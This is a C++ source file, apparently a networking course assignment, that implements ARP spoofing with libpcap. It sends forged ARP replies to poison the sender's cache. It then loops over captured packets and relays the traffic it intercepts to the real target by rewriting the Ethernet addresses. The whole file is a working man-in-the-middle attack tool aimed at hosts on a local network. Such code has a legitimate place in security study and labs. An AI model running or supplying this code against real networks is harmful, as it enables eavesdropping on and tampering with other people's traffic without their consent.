#include <cstdio>
#include <pcap.h>
#include <iostream>
#include "mac.h"
#include "ethhdr.h"
#include "arphdr.h"
#include "mylibnet.h"
#include <unistd.h>
#include <vector>
#include <stdlib.h>
#include <thread>

using namespace std;


vector<Ip> senderList;
vector<Ip> targetList;
vector<Mac> senderMACList;
vector<Mac> targetMACList;
Ip myIp;
u_int8_t myMAC[6];

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> sender target\n");
    printf("sample: send-arp-test wlan0 192.168.123.123 192.168.123.1\n");
}

void sendARP(pcap_t* handle, Ip sender, Ip target, u_int8_t* senderMAC){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(senderMAC);   // sender
    packet.eth_.smac_ = myMAC;   // me
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = myMAC;   //me
    packet.arp_.sip_ = htonl(target); // target
    packet.arp_.tmac_ = Mac(senderMAC);   // sender
    packet.arp_.tip_ = htonl(sender);    // senderIP

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void sendRequest(pcap_t* handle, Ip sender, Ip target){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");   // sender
    packet.eth_.smac_ = myMAC;   // me
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMAC;   //me
    packet.arp_.sip_ = htonl(target); // target
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");   // sender
    packet.arp_.tip_ = htonl(sender);    // senderIP

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}


void getSenderMAC(pcap_t* handle, Ip sender, Ip target, u_int8_t* senderEther){
    while (true) {
        sendRequest(handle, sender, target);
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        ether_header ether = getEther(packet);
        ip_header ip = getIp(packet);

        if(!(ether.type[0] == 0x08 && ether.type[1] == 0x06)) continue;
        if(changeIp(ip.sender) != sender) continue;
        for(int i = 0; i < 6; i++) senderEther[i] = ether.src[i];
        return;
    }
}

void relay(pcap_t* handle, const u_char* packet, int index, int len){
    u_char* sendPacket = (u_char*)malloc(sizeof(u_char) * len);
    for(int i = 0; i < 6; i++) sendPacket[i] = targetMACList[index][i];
    for(int i = 6; i < 12; i++) sendPacket[i] = myMAC[i-6];
    for(int i = 12; i < len; i++) sendPacket[i] = packet[i];
    printf("relayed\n");
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(sendPacket), len);
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    free(sendPacket);
    printf("\n done\n");
}

void relayCheck(const u_char* packet, struct pcap_pkthdr* header, char* interface){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
    ether_header ether = getEther(packet);
    ip_header ip = otherGetIp(packet);

    Ip sender = changeIp(ip.sender);
    Ip target = changeIp(ip.target);

    // If the ip is exist in my arp table
    for(u_int i = 0; i < senderMACList.size(); i++){
        // If target is not my IP
        if(Mac(ether.src) == senderMACList[i] && target != myIp){
            // When Destination is my MAC Address
           if(Mac(ether.dest) == Mac(myMAC)){
               printf("packet size : %d\n", header->len);
               printf("Find!!! %d.%d.%d.%d -> %d.%d.%d.%d\n", ip.sender[0], ip.sender[1], ip.sender[2], ip.sender[3], ip.target[0], ip.target[1], ip.target[2], ip.target[3]);
               relay(handle, packet, i, header->caplen);
               pcap_close(handle);
               return;
           }
        }
    }
}

void observer(pcap_t* handle, char* interface){
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        thread relayCheckThread(relayCheck, packet, header, interface);
        relayCheckThread.join();
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || !argc%2) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    for(int i = 2; i < argc; i+=2){
        senderList.push_back(Ip(argv[i]));
        targetList.push_back(Ip(argv[i+1]));
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    getMAC(dev, myMAC);
    myIp = getMyIP(dev);
    for(int i = 0; i < (argc-1)/2; i++){
        printf("...");
        u_int8_t senderMAC[6]; getSenderMAC(handle, senderList[i], targetList[i], senderMAC);
        u_int8_t targetMAC[6]; getSenderMAC(handle, targetList[i], senderList[i], targetMAC);
        senderMACList.push_back(Mac(senderMAC));
        targetMACList.push_back(Mac(targetMAC));
        sendARP(handle, senderList[i], targetList[i], senderMAC);
        printf(" done %d!\n", i+1);
    }

    printf("Finished send ARP packet!\n");

    observer(handle, dev);

    pcap_close(handle);
}
